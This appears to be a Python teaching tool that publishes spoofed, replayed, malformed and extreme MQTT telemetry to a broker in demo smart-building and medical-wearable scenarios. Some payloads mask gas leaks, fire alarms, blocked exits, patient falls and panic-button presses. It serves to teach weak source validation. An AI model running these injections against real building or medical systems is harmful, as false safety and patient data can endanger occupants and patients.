#!/usr/bin/env python3
"""Reusable SISEN MQTT-layer attack demonstrations.

These attacks intentionally publish bounded, easy-to-observe MQTT messages for
teaching. They do not attempt to exploit a broker; they demonstrate what weak
source validation and unauthenticated telemetry can look like at the application
layer.
"""

import argparse
import os
import time

import paho.mqtt.publish as publish

DEFAULT_MEDICAL_PATIENT_COUNT = 4
MAX_MEDICAL_PATIENT_COUNT = 10


def active_medical_patient_count():
    try:
        count = int(os.environ.get("SISEN_PATIENT_COUNT", str(DEFAULT_MEDICAL_PATIENT_COUNT)))
    except ValueError:
        count = DEFAULT_MEDICAL_PATIENT_COUNT
    return max(1, min(count, MAX_MEDICAL_PATIENT_COUNT))


def medical_components():
    fields = {
        "heart_rate": "vitals/heart_rate",
        "spo2": "vitals/spo2",
        "blood_pressure": "vitals/blood_pressure",
        "fall_alert": "alerts/fall_alert",
        "panic_button": "alerts/panic_button",
        "battery_status": "alerts/battery_status",
        "wearable_link": "alerts/wearable_link",
    }
    count = active_medical_patient_count()
    return {
        f"patient-{index}": {
            "label": f"Patient {index}",
            "topic_prefix": f"patient/patient-{index}",
            "aggregate_prefix": "patient/vitals",
            "fields": fields,
            "aggregate_fields": {"heart_rate", "spo2", "blood_pressure"},
            "aggregate_source": index == 1,
        }
        for index in range(1, count + 1)
    }


SCENARIOS = {
    "building": {
        "description": "Smart Building telemetry",
        "components": {
            "node-01": {
                "label": "Room 101",
                "topic_prefix": "building/nodes/node-01",
                "generic_prefix": "building",
                "fields": {
                    "temperature": "temperature",
                    "fire_alarm": "fire_alarm",
                    "occupancy": "occupancy",
                    "gas_leak": "gas_leak",
                },
            },
            "node-02": {
                "label": "Plant Room",
                "topic_prefix": "building/nodes/node-02",
                "generic_prefix": "building",
                "fields": {
                    "humidity": "humidity",
                    "air_quality": "air_quality",
                    "smoke": "smoke",
                    "co2": "co2",
                },
            },
            "node-03": {
                "label": "Server Room",
                "topic_prefix": "building/nodes/node-03",
                "generic_prefix": "building",
                "fields": {
                    "temperature": "temperature",
                    "smoke": "smoke",
                    "sprinkler_status": "sprinkler_status",
                    "exit_status": "exit_status",
                },
            },
            "node-04": {
                "label": "Workshop",
                "topic_prefix": "building/nodes/node-04",
                "generic_prefix": "building",
                "fields": {
                    "temperature": "temperature",
                    "air_quality": "air_quality",
                    "occupancy": "occupancy",
                    "gas_leak": "gas_leak",
                },
            },
        },
        "attacks": {
            "spoofed": {
                "purpose": "Plausible but false room states from trusted-looking node topics.",
                "payloads": [
                    ("node-01", "occupancy", "Occupied"),
                    ("node-01", "gas_leak", "Gas detected"),
                    ("node-02", "air_quality", "1800"),
                    ("node-02", "smoke", "Smoke detected"),
                    ("node-04", "occupancy", "Occupied"),
                    ("node-04", "gas_leak", "Gas detected"),
                ],
            },
            "extreme": {
                "purpose": "Manipulated unsafe readings across multiple appropriate rooms.",
                "payloads": [
                    ("node-01", "temperature", "85.00"),
                    ("node-01", "fire_alarm", "Fire detected"),
                    ("node-01", "gas_leak", "Gas detected"),
                    ("node-02", "humidity", "5.00"),
                    ("node-02", "air_quality", "5000"),
                    ("node-02", "co2", "High CO2"),
                    ("node-03", "temperature", "78.00"),
                    ("node-03", "smoke", "Smoke detected"),
                    ("node-03", "sprinkler_status", "Disabled"),
                    ("node-03", "exit_status", "Blocked"),
                    ("node-04", "temperature", "82.00"),
                    ("node-04", "gas_leak", "Gas detected"),
                ],
            },
            "replay": {
                "purpose": "Repeated stale but plausible Smart Building values.",
                "payloads": [
                    ("node-01", "temperature", "20.10"),
                    ("node-01", "fire_alarm", "Normal"),
                    ("node-01", "occupancy", "Vacant"),
                    ("node-01", "gas_leak", "Normal"),
                    ("node-02", "humidity", "44.00"),
                    ("node-02", "air_quality", "610"),
                    ("node-02", "smoke", "Clear"),
                    ("node-03", "temperature", "21.30"),
                    ("node-03", "smoke", "Clear"),
                    ("node-03", "sprinkler_status", "Standby"),
                    ("node-03", "exit_status", "Clear"),
                ],
            },
            "malformed": {
                "purpose": "Unexpected scalar values that the dashboard can receive but cannot interpret cleanly.",
                "payloads": [
                    ("node-01", "temperature", "not-a-temperature"),
                    ("node-01", "fire_alarm", "???"),
                    ("node-02", "humidity", '{"unexpected":"json"}'),
                    ("node-02", "air_quality", "-999"),
                    ("node-03", "sprinkler_status", "maybe"),
                    ("node-04", "occupancy", ""),
                ],
            },
            "noise": {
                "purpose": "Bounded noisy telemetry bursts that compete with normal updates without stopping publishers.",
                "payloads": [
                    ("node-01", "occupancy", "Occupied"),
                    ("node-01", "occupancy", "Vacant"),
                    ("node-02", "air_quality", "880"),
                    ("node-02", "air_quality", "1180"),
                    ("node-04", "occupancy", "Occupied"),
                    ("node-04", "occupancy", "Vacant"),
                ],
            },
            "gas-leak-hidden": {
                "purpose": "Safety case: occupancy is present while gas status is falsely reassuring.",
                "payloads": [
                    ("node-01", "occupancy", "Occupied"),
                    ("node-01", "temperature", "24.20"),
                    ("node-01", "gas_leak", "Normal"),
                ],
            },
            "fire-alarm-suppressed": {
                "purpose": "Safety case: unsafe heat while the fire alarm remains normal.",
                "payloads": [
                    ("node-01", "temperature", "72.50"),
                    ("node-01", "occupancy", "Occupied"),
                    ("node-01", "fire_alarm", "Normal"),
                ],
            },
            "blocked-exit-hidden": {
                "purpose": "Safety case: smoke in the Server Room while response systems look safe.",
                "payloads": [
                    ("node-03", "smoke", "Smoke detected"),
                    ("node-03", "exit_status", "Clear"),
                    ("node-03", "sprinkler_status", "Standby"),
                ],
            },
        },
    },
    "medical": {
        "description": "Medical wearable telemetry",
        "components": medical_components,
        "attacks": {
            "spoofed": {
                "purpose": "Plausible false patient states while impersonating selected wearables.",
                "payloads": [
                    ("patient-2", "heart_rate", "96"),
                    ("patient-2", "spo2", "95"),
                    ("patient-2", "blood_pressure", "138/88"),
                    ("patient-2", "fall_alert", "Fall detected"),
                    ("patient-2", "panic_button", "Not pressed"),
                    ("patient-2", "battery_status", "Normal"),
                    ("patient-3", "heart_rate", "88"),
                    ("patient-3", "spo2", "96"),
                    ("patient-3", "blood_pressure", "132/84"),
                    ("patient-3", "fall_alert", "No fall"),
                    ("patient-3", "panic_button", "Pressed"),
                    ("patient-3", "battery_status", "Normal"),
                ],
            },
            "extreme": {
                "purpose": "Unsafe and inconsistent patient states across several wearables.",
                "payloads": [
                    ("patient-1", "heart_rate", "145"),
                    ("patient-1", "spo2", "82"),
                    ("patient-1", "blood_pressure", "190/120"),
                    ("patient-1", "fall_alert", "Fall detected"),
                    ("patient-1", "panic_button", "Pressed"),
                    ("patient-1", "battery_status", "Battery critical"),
                    ("patient-2", "heart_rate", "42"),
                    ("patient-2", "spo2", "88"),
                    ("patient-2", "blood_pressure", "86/54"),
                    ("patient-2", "fall_alert", "No fall"),
                    ("patient-2", "wearable_link", "Connected"),
                    ("patient-3", "heart_rate", "128"),
                    ("patient-3", "spo2", "91"),
                    ("patient-3", "blood_pressure", "176/110"),
                    ("patient-3", "panic_button", "Pressed"),
                    ("patient-4", "heart_rate", "118"),
                    ("patient-4", "spo2", "84"),
                    ("patient-4", "blood_pressure", "152/98"),
                    ("patient-4", "battery_status", "Battery critical"),
                ],
            },
            "replay": {
                "purpose": "Repeated stale but plausible patient readings.",
                "payloads": [
                    ("patient-2", "heart_rate", "67"),
                    ("patient-2", "spo2", "99"),
                    ("patient-2", "blood_pressure", "118/76"),
                    ("patient-2", "fall_alert", "No fall"),
                    ("patient-2", "panic_button", "Not pressed"),
                    ("patient-2", "battery_status", "Normal"),
                ],
            },
            "malformed": {
                "purpose": "Unexpected patient payload formats that classify as unknown or ambiguous.",
                "payloads": [
                    ("patient-3", "heart_rate", "fast"),
                    ("patient-3", "spo2", "NaN"),
                    ("patient-3", "blood_pressure", "broken"),
                    ("patient-3", "fall_alert", "unknown"),
                    ("patient-4", "panic_button", "maybe"),
                    ("patient-4", "battery_status", ""),
                ],
            },
            "noise": {
                "purpose": "Bounded competing patient updates across multiple wearables without stopping the live gateway.",
                "payloads": [
                    ("patient-1", "heart_rate", "74"),
                    ("patient-1", "heart_rate", "104"),
                    ("patient-1", "spo2", "97"),
                    ("patient-1", "spo2", "94"),
                    ("patient-2", "wearable_link", "Disconnected"),
                    ("patient-2", "wearable_link", "Connected"),
                    ("patient-3", "panic_button", "Not pressed"),
                    ("patient-3", "panic_button", "Pressed"),
                    ("patient-4", "battery_status", "Normal"),
                    ("patient-4", "battery_status", "Battery critical"),
                ],
            },
            "fall-alert-suppressed": {
                "purpose": "Safety case: deteriorating vitals while fall status remains falsely normal.",
                "payloads": [
                    ("patient-2", "heart_rate", "112"),
                    ("patient-2", "spo2", "93"),
                    ("patient-2", "blood_pressure", "148/96"),
                    ("patient-2", "fall_alert", "No fall"),
                ],
            },
            "battery-falsely-normal": {
                "purpose": "Safety case: wearable link reliability risk while battery appears normal.",
                "payloads": [
                    ("patient-4", "heart_rate", "76"),
                    ("patient-4", "spo2", "98"),
                    ("patient-4", "blood_pressure", "122/78"),
                    ("patient-4", "wearable_link", "Disconnected"),
                    ("patient-4", "battery_status", "Normal"),
                ],
            },
            "panic-button-suppressed": {
                "purpose": "Safety case: unsafe vitals while the panic button remains falsely unpressed.",
                "payloads": [
                    ("patient-3", "heart_rate", "132"),
                    ("patient-3", "spo2", "91"),
                    ("patient-3", "blood_pressure", "176/110"),
                    ("patient-3", "panic_button", "Not pressed"),
                ],
            },
        },
    },
}
SCENARIO_ALIASES = {}


ATTACKS = tuple(
    sorted({attack for profile in SCENARIOS.values() for attack in profile["attacks"]})
)


def event_topics(component, field):
    field_topic = component["fields"][field]
    topics = [f"{component['topic_prefix']}/{field_topic}"]
    if component.get("aggregate_source") and field in component.get("aggregate_fields", set()):
        topics.append(f"{component['aggregate_prefix']}/{field}")
    elif component.get("generic_prefix"):
        topics.append(f"{component['generic_prefix']}/{field}")
    return topics


def publish_event(host, port, component_id, component, field, payload):
    label = component["label"]
    print(f"{label} ({component_id}): {field} <- {payload}")
    for topic in event_topics(component, field):
        print(f"  {topic} <- {payload}")
        publish.single(topic, payload, hostname=host, port=port)


def publish_payloads(host, port, components, payloads, delay):
    for component_id, field, payload in payloads:
        if component_id not in components:
            available = ", ".join(sorted(components))
            raise SystemExit(
                f"Attack references {component_id}, but active components are: {available}. "
                "For Medical attacks, set SISEN_PATIENT_COUNT to match the running scenario."
            )
        component = components[component_id]
        if field not in component["fields"]:
            raise SystemExit(f"Attack references unsupported field {component_id}.{field}.")
        publish_event(host, port, component_id, component, field, payload)
        if delay:
            time.sleep(delay)


def run_attack(args):
    scenario = SCENARIO_ALIASES.get(args.scenario, args.scenario)
    profile = SCENARIOS[scenario]
    attack = profile["attacks"][args.attack]
    components_spec = profile["components"]
    components = components_spec() if callable(components_spec) else components_spec
    payloads = attack["payloads"]

    print(f"SISEN MQTT attack demo: {args.attack}")
    print(f"Scenario: {args.scenario} ({profile['description']})")
    print(f"Purpose: {attack['purpose']}")
    print(f"Broker: {args.host}:{args.port}")
    if scenario == "medical":
        print(f"Active Medical patients: {', '.join(sorted(components))}")
    print()

    if args.attack == "noise":
        for index in range(args.count):
            print(f"Noise burst {index + 1}/{args.count}")
            publish_payloads(args.host, args.port, components, payloads, args.delay)
        return

    if args.attack == "replay":
        for index in range(args.count):
            if args.count > 1:
                print(f"Replay {index + 1}/{args.count}")
            publish_payloads(args.host, args.port, components, payloads, args.delay)
        return

    deadline = time.monotonic() + args.duration if args.duration > 0 else None
    published = 0
    while True:
        published += 1
        if published > 1:
            print(f"Refresh {published}")
        publish_payloads(args.host, args.port, components, payloads, args.delay)
        if deadline is None or time.monotonic() >= deadline:
            break


def main():
    parser = argparse.ArgumentParser(description="Run bounded MQTT-layer SISEN attack demonstrations.")
    parser.add_argument("--scenario", choices=sorted([*SCENARIOS, *SCENARIO_ALIASES]), required=True)
    parser.add_argument("--attack", choices=ATTACKS, required=True)
    parser.add_argument("--host", default="localhost")
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument("--count", type=int, default=5, help="Repeat count for replay/noise attacks.")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between publishes.")
    parser.add_argument("--duration", type=float, default=10.0, help="Seconds to refresh non-replay attacks for dashboard visibility.")
    args = parser.parse_args()

    if args.count < 1:
        parser.error("--count must be at least 1")
    if args.delay < 0:
        parser.error("--delay must be zero or greater")
    if args.duration < 0:
        parser.error("--duration must be zero or greater")

    run_attack(args)


if __name__ == "__main__":
    main()
